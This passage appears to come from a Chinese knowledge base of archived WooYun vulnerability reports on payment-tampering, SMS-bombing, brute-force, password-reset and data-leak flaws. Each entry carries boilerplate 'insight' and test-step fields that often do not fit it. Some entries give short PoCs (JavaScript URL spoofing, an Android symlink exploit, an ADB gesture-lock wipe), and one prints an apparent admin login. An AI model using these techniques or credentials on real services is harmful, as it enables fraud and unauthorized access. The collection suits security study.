1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏])*28+22=19元，成功提交订单并付款。购物车确认时提交POST的内容如下：POST /order/confirm HTTP/1.1Host: store.hicling.comAccept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cnAccept-Encoding: gzip, deflateOrigin: https://example.com/[已脱敏] keep-aliveUser-

**POC**: 修改并发包后，返回的确认内容如下：成功付款截图：

**绕过**: 直接利用

**修复**: 所以参数都要做校验，，我还没测试其他参数，，不过你们开发的肯定是所以参数都应该在服务器端校验的，，
---

---
### [wooyun-2013-033975] 长虹手机官网商城支付漏洞 0.1元买手机
**厂商**: 长虹手机 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 嘛https://example.com/[已脱敏] 点开我们伟大的F12改成0.1然后付款走起

**POC**: 请等待发货！

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2014-075926] 畅途网酒店预订支付逻辑漏洞(0元订酒店)
**厂商**: 畅途网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接这样就可以创建订单！主要字段 totalPricehttps://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0114602] 喜马拉雅P2P理财存在支付逻辑漏洞（凭空增加积分）
**厂商**: 喜马拉雅P2P理财 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 喜马拉雅P2P理财支付漏洞，积分兑换可以进行数量负数购买

**POC**: 1：2;3:账户积分变多了

**绕过**: 直接利用

**修复**: 数量代码限制负数。。。
---

---
### [wooyun-2015-0158772] 无限访问页面可造成手机短信轰炸功能
**厂商**: 绿银金融 | **年份**: 2015 | **类型**: 无限短信发送

**元思考**: 触发信号: 参数注入

**洞察**: 无限短信发送防护不足，开发者信任前端输入

**测试流程**:
1. 识别无限短信发送相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在关注某互联网公司后，某互联网公司自动发送一条消息：点击该链接可进入注册页面（该页面可电脑访问）输入手机号后，提示成功当再次点击发送的时候这时按F12调出网页控制台可以得到该参数为：phoneNumber=手机号看看js文件:这样就构造出一个地址https://**.**.**.**/wap/member/phoneCheckCodeSend.action?phoneNumber=手机号码当页面访问的时候可以直接提交上去，并没有加入手机号验证。

**POC**: 这样应该能够证明了吧。。。

**绕过**: 直接利用

**修复**: 建议在后台加入手机的验证或者一个IP只能发送几条信息。其实我也不会
---

---
### [wooyun-2015-0110620] 团贷网某处支付漏洞
**厂商**: tuandai.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机客户端购买会员正常数据包如下把月份改成-100 方式用积分或者余额都可以

**POC**: 直接支付成功过期日期到了2006年这样就做到了永不过期

**绕过**: 直接利用

**修复**: 不允许负数
---

---
### [wooyun-2015-0145212] 冰山互联支付逻辑漏洞可一元购买最高配置vps挂机宝
**厂商**: 四川网居时代科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0132528] 某集团商城存在密码重置漏洞
**厂商**: ecitic.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏])存在逻辑漏洞首先注册一个账号然后在登入的地方点击忘记密码找回在提交验证码的时候 没做限制 ge请求 很容易爆破现在我们用burp进行跑验证码爆破成功：获取到正确的验证码后

**POC**: 综上

**绕过**: 直接利用

**修复**: 请加强次数限制
---

---
### [wooyun-2015-0113855] 263通信又一处支付功能逻辑漏洞（导致账户可每月定期领钱）
**厂商**: 263通信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 263网络视频会议业务开通或变更：https://example.com/[已脱敏]

**POC**: 非常抱歉，又多了两百，麻烦管理员把数据改回去吧，我当前余额应该￥2.1我的账号你们知道的。

**绕过**: 直接利用

**修复**: 开发人员的奖金和福利没给到位是问题的根本。
---

---
### [wooyun-2013-040087] 某搜索引擎卫士存在设计缺陷导致存在风险
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎卫士存在设计缺陷。1.某搜索引擎卫士的用户配置文件夹在系统盘的C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn下面，这个文件夹里面没有自我保护，所有程序都有写入权限，这边就很容易出问题。我们看到上面图里面用户优化过的计划任务项目被备份在了上面的文件夹里面。C:\Documents and Settings\All Users\Application Data\baidu\BaiduAn\FTSOManager\BDMDisabled\Tasks这个文件夹是任何权限都可以写入。那么这边就出现缺陷了。2.我们随便做个测试吧。自己写个test.job写到这个文件夹下面去。看看在某搜索引擎卫士相关位置能不能显示。如果能显示的话应该就有缺陷，有可趁之机。你看，在计划任务处被显示了。而且状态是“禁用”，并且可以被启用。3.如何

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置权限不能任意写入/删除
---

---
### [wooyun-2014-062547] 收货宝APP手机验证码绕过随意登录账户
**厂商**: 收货宝 | **年份**: 2014 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 认证接口

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆APP我们以13888888888为例，获取验证码，截包。查看回包，尼玛，验证码！登上去了

**POC**: 登陆APP我们以13888888888为例，获取验证码，截包。查看回包，尼玛，验证码！登上去了

**绕过**: 直接利用

**修复**: 看着修吧。任意登陆这个略严重呢...
---

---
### [wooyun-2015-0107732] 老板电器官方购物商城任意修改价格且支付成功
**厂商**: 老板电器 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、首先选择一件商品，这里为了测试，选择商城中最便宜的一件商品作为测试商品49元，“立即购买”后，通过fiddler拦截请求。二、对价格进行修改将“49”改成“1”三、生成的订单中已经由49元变成1元了四、生成订单后，进入支付阶段，通过拦截请求可知，此后的该订单的总价已全部变成1元了五、付款选择某电商平台，可以正常支付

**POC**: 这里用1元支付完成最后支付流程，订单最后完成

**绕过**: 直接利用

**修复**: 对支付产生关键影响的所有参数都应该签名，并且要做验证。
---

---
### [wooyun-2015-0100859] 嘀嗒拼车某逻辑漏洞泄露用户敏感信息第二弹(包括车主证件)
**厂商**: didapinche.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: App 调用的很多 api 设计有缺陷, 在很多 api 中看到用户的详细信息比如获得用户的详细信息http://[IP已脱敏] api 构成一个完整的穷举链条通过手动设置任何经纬度的拼单列表 /BookingDriver/getNearbyBookingRideList, 我们可以获得 任意地点的 user 的 id (user_cid) , 通过 /User/getUserSimpleInfo  可以查看详细的用户信息.POST 的 parameter 中 vkey 的逻辑可以很简单的逆向获得.比如 ts 获得时间戳 2015031200544

**POC**: 比如上一弹中的 469c6750-4ba2-49ce-8baa-43e8640229ac行驶证什么不直接证明了简单的 EXP (需要你自己提供登录后的 token 和 user_cid)https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-082981] ecshop后台暴力破解验证码绕过
**厂商**: ShopEx | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆请求为username=admin&password=admin888&captcha=1111&act=signin请求的时候去掉cookie中的ECSCP_ID=参数服务端就会不验证验证码直接验证账号的密码是否正确。使用burp进行暴力破解测试。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改验证码的验证逻辑
---

---
### [wooyun-2013-019479] 安卓卫士设计不当临时解锁密码泄漏
**厂商**: Kindroid | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 借同学手机打电话，结果忘了告诉我密码。。于是就有了下面的漏洞。。。视频密码w00yun在特定条件下，SIM卡无法发送短信，android系统会返回短信到状态栏，临时密码泄漏

**POC**: 视频密码w00yun

**绕过**: 直接利用

**修复**: 同时覆盖状态栏
---

---
### [wooyun-2014-061560] 搜狗手机浏览器逻辑缺陷可获取隐私信息
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狗手机浏览器在file域下存在逻辑缺陷，导致可以用符号链接绕过同源策略，可以获取用户cookie等隐私信息等。

**POC**: import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.Intent;public class MainActivity extends Activity {public final static String MY_PKG ="com.example.testsougou";public final static String MY_TMP_DIR ="/data/data/" + MY_PKG + "/tmp/";public final stati

**绕过**: 过滤绕过

**修复**: 对file域下符号链接进行限制
---

---
### [wooyun-2014-074728] 时代焦点支付接口未检验支付金额
**厂商**: 360class.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在支付页支付时是提交表单到后台处理然后再提交给第三方支付平台的。因为设计逻辑缺陷，订单金额是在前端计算提交给后端的，并且在使用「网银在线」支付方式是并没有校验金额。实际上我认为金额就不应在这里传，只需要传订单号就够了，因为后端根据订单号可以获取到金额的，针对另两种支付方式的检验也是多余的。<form action="/pay/chinaBankpay!toPay.action" method="post" target="_blank" id="chinaBankpayFrm" name="chinaBankpayFrm" style="display: none"><input type="hidden" name="orderNo" id="orderNo" value="20140902xxxxxxxxx"><br><input type="hidden" name="cusId" 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 详细说明中已经提到了。只传订单号到后端，然后直接获取金额传给第三方支付系统。
---

---
### [wooyun-2014-048496] 同程网app某接口无验证码爆破账户密码
**厂商**: 某旅游公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: https://example.com/[已脱敏] 81Cache-Control: max-age=0Origin: https://example.com/[已脱敏] application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;

**POC**: POST /membership/applylogin.html?returnUrl=%2fdeal%2ftcmemberapplycash.html HTTP/1.1Host: touch.17u.cnProxy-Connection: keep-aliveReferer: https://example.com/[已脱敏] 81Cache-Control: max-age=0Origin: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 限制次数 加验证码
---

---
### [wooyun-2014-079085] 药房网订单提交存在逻辑漏洞可对企业造成经济损失（一种新的支付缺陷）
**厂商**: yaofang.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交订单的时候可以修改运费修改前修改后提交后订单的价格变了

**POC**: 可以确认这个订单的运费变成了1元

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2013-033399] 新世界百货存在支付漏洞
**厂商**: xinbaigo.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: - - 审核大大 就不要让我付款证明了吧。。。我家穷 而且你仔细看看订单都显示是20块。。。付款的时候也显示20快求礼物。。。。礼物啊~

**绕过**: 直接利用

**修复**: 你知道的
---

---
### [wooyun-2015-0108047] 分分钟搞定邮箱大师手势密码
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.上个提交的漏洞有的人可能还会说，我设置了手势密码，黑客就算盗了我应用所有数据，他打开应用一样要输入手势密码才能登录，其实，对黑客来说这些都不是事2.在/data/data/com.netease.mail/shared_prefs/下的android-lockpattern-xxx.xml中保存着邮箱大师手势密码配置3.当用户未开启手势密码时，文件内容是这样的：<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><null name="alp.pkey.sys.pattern" /><int name="alp.pkey.display.cur_retry" value="0" /><boolean name="alp.pkey.sys.auto_save_pattern" value="false" /></map

**POC**: 利用方式：1.通过ADB，复制应用数据后如发现有手势密码，直接替换相关android-lockpattern-xxx.xml文件为如下内容，重启邮箱大师APP，手势密码会自动清除：<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><null name="alp.pkey.sys.pattern" /><int name="alp.pkey.display.cur_retry" value="0" /><boolean name="alp.pkey.sys.auto_save_pattern" value="false" /

**绕过**: 直接利用

**修复**: 不用xml方式配置手势密码怎么样？或者检测到xml文件被修改后直接清空登录凭证
---

---
### [wooyun-2015-099355] 大信ERP敏感参数泄漏导致可直接访问后台（泄露大量企业信息）
**厂商**: 大信ERP | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞URL：https://example.com/[已脱敏]

**POC**: 涉及敏感信息太多，不可多截图- -审核人员一看就懂的

**绕过**: 直接利用

**修复**: 某搜索引擎一下
---

---
### [wooyun-2015-0103458] Wacom中国网站支付漏洞（未修复完成）
**厂商**: wacom.com.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 回来的时候发现之前的订单显示交易完成了,吓我一跳我没有收到货啊！感觉应该是人工审核订单  看到负号所以没有发货。我竟然花了31块钱去测试,能报销吗？ 不能报销送个礼物安慰一下可好？订单号:D20150227194335297问题网站https://example.com/[已脱敏] burp  添加数量 抓包  改数量  没错 就是那么简单！改完后刷新一下就好了！经测试  搭配出了一个组合 最后剩下一块钱 可是最后邮费要30无线无源鼠标	                        x 1商品编号：KC-100-00DB无线套件                                 x 1商品编号：ACK-40401学习板One By Wacom CTL-671/K0-F	       

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 要修复就修复的彻底一点。
---

---
### [wooyun-2016-0182302] 口袋购物BMB管理后台逻辑缺陷导致百万商家信息泄露
**厂商**: koudai.com | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注：可增 删 改 查涉及 二百八十五万 商家https://example.com/[已脱敏] username及密码请脑补此过程wangxin：koudai2013

**POC**: 查看商家列表已入住商家https://example.com/[已脱敏]  给高rank吧  不要小瞧一个小小的安全问题

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-099516] 华宇拼音输入法存在可信任路径代码执行漏洞
**厂商**: 北京华宇软件股份有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华宇拼音输入法 [IP已脱敏]使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。华宇拼音输入法的设置功能upimcfg6.exe存在可信任路径代码执行漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参考WooYun: 某搜索引擎输入法调用CreateProcess函数漏洞
---

---
### [wooyun-2014-081421] 住趣家居一处逻辑缺陷导致用户信息泄露
**厂商**: 住趣家居 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 你们打电话说要送礼品，于是就测了下，发现个支付漏洞和这个本来打算给你们邮件的，结果支付漏洞修了，我哭了。别这个也修了 还是提乌云吧https://example.com/[已脱敏]

**POC**: 提交订单时候抓包delivery_id是可以改的改个8试试就能看到了

**绕过**: 直接利用

**修复**: 提交订单如果需要把地址显示出来 查询的时候就带上uid
---

---
### [wooyun-2012-014984] 某电脑厂商短信验证码批量发送
**厂商**: 某电脑厂商 | **年份**: 2012 | **类型**: 短信轰炸

**元思考**: 触发信号: 功能测试

**洞察**: 短信轰炸防护不足，开发者信任前端输入

**测试流程**:
1. 识别短信轰炸相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 初步测试，通过burp测试发送了10条短信验证码都成功。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置短信验证码发送时间间隔，或者验证码啥的
---

---
### [wooyun-2013-025160] 通过手机游侠(八门神器)修改某互联网公司旗下一火爆网游数据，刷钱
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.开一个游侠，然后进入游戏.2.选择一个不要的装备，装备到战将身上。进入该装备的强化界面如果你现在的装备是12级，下一级强化就是13 你就搜索13.  搜索完以后拖动强化装备的进度条，比如拖到强化到15.然后搜索15回去再拖动，再查询。 最后还剩1个数据或者两个数据，就修改。并且锁定。  锁定完成点击强化。  你会发现装备变成负数了3.回到游戏的主界面，把刚才修改的值取消锁定。再回到刚才强化装备的页面，你会发现，没强化一次，钱就多一次(绝对不是本地YY)     提交到了服务器

**POC**: 放一张我第一次用大号刷的，  别封号啊。   我也是尝试，没想到就成功了，这个小号是我临时搞的，就是做证明！！这是我强化玩装备以后，小号截图看的大号!

**绕过**: 直接利用

**修复**: 这个，你们比我清楚。。。     多少给几分啊...
---

---
### [wooyun-2013-016875] Safari URL欺骗漏洞(二)
**厂商**: Apple | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于firefox在实现data uri协议的时候不指定mediatype也是一个合法的data url,导致我们可以在parameters处做url欺骗.

**POC**: <script>function poc(){var w=open('data:;//view.news.某域名.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>

**绕过**: 直接利用

**修复**: 限制data uri parameters的格式
---

---
### [wooyun-2014-079261] 上品折扣网存在任意金额支付漏洞
**厂商**: 上品折扣网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某大型购物网站任意金额支付漏洞

**POC**: shopin.net   上品折扣网选择一件商品购买 抓取post的数据包修改数据，奖金额修改为1提交订单后实现任意金额支付，1元无限购

**绕过**: 直接利用

**修复**: 修复逻辑
---

---
### [wooyun-2014-068602] 朝暮数据设计缺陷刷钱漏洞
**厂商**: zhaomu.com | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在弹性云主机这块..没有对cpu数量之类的参数是否大于0做判断  然后..抓包把cpu数量的参数改成负的..提交..点付款（余额是最开始测试弄得）最后余额多了...

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 判断提交的数值是否大于0即可
---

---
### [wooyun-2013-023746] Espcms V5.[IP已脱敏] UTF8 正式版另类过后台所有模块验证漏洞之5/N
**厂商**: 易思ESPCMS企业网站管理系统 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台权限验证的类文件：\public\class_connector.phpfunction admin_purview() {if ($this->fun->accept('archive', 'R') == 'filemanage' && $this->fun->accept('action', 'R') == 'batupfilesave') {$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'G');$esp_powerlist = $this->fun->accept('esp_powerlist', 'G');$gettype = false;} else {$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'C');$esp_powerlist =

**POC**: 下面显示Cookie err，木问题，点其他连接都是OK的

**绕过**: 直接利用

**修复**: 后台的权限还是从cookie解密获取帐号和密码后去数据库验证一遍
---

---
### [wooyun-2015-0151221] 云片网某处存在设计逻辑缺陷漏洞
**厂商**: 云片网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 云片短信验证码平台，短信充值数量可被修改为大于1的任何数字。通过工具抓包可以得到在充值短信时POST了指定数据到以下页面，https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 之所以把这个小漏洞挖出来，主要还是因为自己是一个小小的个人开发者，对于一口气必须充值一万条来说，550对自己而言可能就显得很昂贵，所以还请云片高抬贵手。正常流程应该不能在这里直接传入充值数量，而是类似于一个套餐ID，每个套餐对应一个充值的数量，这样就算使用我之前的方式，改了套餐ID也是无济于事的。
---

---
### [wooyun-2015-0102297] 威锋某分站购买产品存在支付漏洞（低价购买高价商品）
**厂商**: weiphone | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /api/pay/pay.php HTTP/1.1Host: www.wefinder.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] CNZZDATA30052730=cnzz_eid%3D1685122873-1426734709-%26ntime%

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 危害不小吧～求高rank～
---

---
### [wooyun-2012-07888] 万网某管理系统帐户系统逻辑漏洞
**厂商**: 万网 | **年份**: 2012 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题的站点:https://example.com/[已脱敏]  万网ICP代备案管理系统。自己新买一个域名要做备案,可惜申请时密码忘记了,故找回密码,收到找回邮件链接如下:按照提示修改自己密码成功。。职业病原因,顺手将url中邮箱地址替换成admin@hichina.com修改,悲剧,修改成功。。。如图:也就是说,只要知道确实存在的账户,即可直接修改该帐号密码。

**POC**: 如图:

**绕过**: 直接利用

**修复**: 让程序员改吧。。。
---

---
### [wooyun-2015-0138016] 115浏览器跨协议漏洞(可造成泄漏本地文件信息)
**厂商**: 115网盘 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 115浏览器最新版：正常而言，访问url链接的方式无外乎两种：window.open()location.href='xxx';但是因为chrome的严格限制，上面的2种api都是没办法访问chrome://协议的资源以及file://的资源的：通过上述2个api访问，弹出的只是about:blank，这种人畜无害的链接。（无法访问对应的资源的）通过对115浏览器自带api的研究，我发现有一个对象不需要特权域，你是用115浏览器的用户，就能调用该对象：browserInterface该对象又有一个方法：browserInterface.openSpecificURL();伪代码：browserInterface.openSpecificURL(url)此处我们仅仅需要传入一个url，通过该api，即可跨越浏览器边界，实现访问本地资源！构造好的poc：https://example.com/[已脱敏]

**POC**: 当然，也可以调用本地的任意exe，只不过会显示没有数字签名：实际测试也能访问chrome://的内容。具体不表。

**绕过**: 直接利用

**修复**: 修复该api能跨越任意协议的问题，起码得禁止跨域至file://，chrome，等敏感高权限的域。
---

---
### [wooyun-2012-015067] 中粮52buy商城的支付漏洞
**厂商**: 中粮我买网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在比较严重的支付逻辑漏洞

**POC**: 只要在此处强行插入“-”号就可以直接下单了。送我个邀请码哈。嘿嘿。

**绕过**: 直接利用

**修复**: 这个，wooyun 的一句老话，你比我懂、
---

---
### [wooyun-2015-0139996] 金山wps加载OLE对象之内存未初始化第二弹
**厂商**: 某软件厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司控件appcom.dll同样对象没初始化,导致00000000地址访问错误(需要安装某互联网公司)自评rank5是我还没有找到污染此对象的方法,但是不代表不可用.

**POC**: 内存没有初始化,污染此对象可以挟持稍后的call [ecx+0xC]从而挟持eip

**绕过**: 直接利用
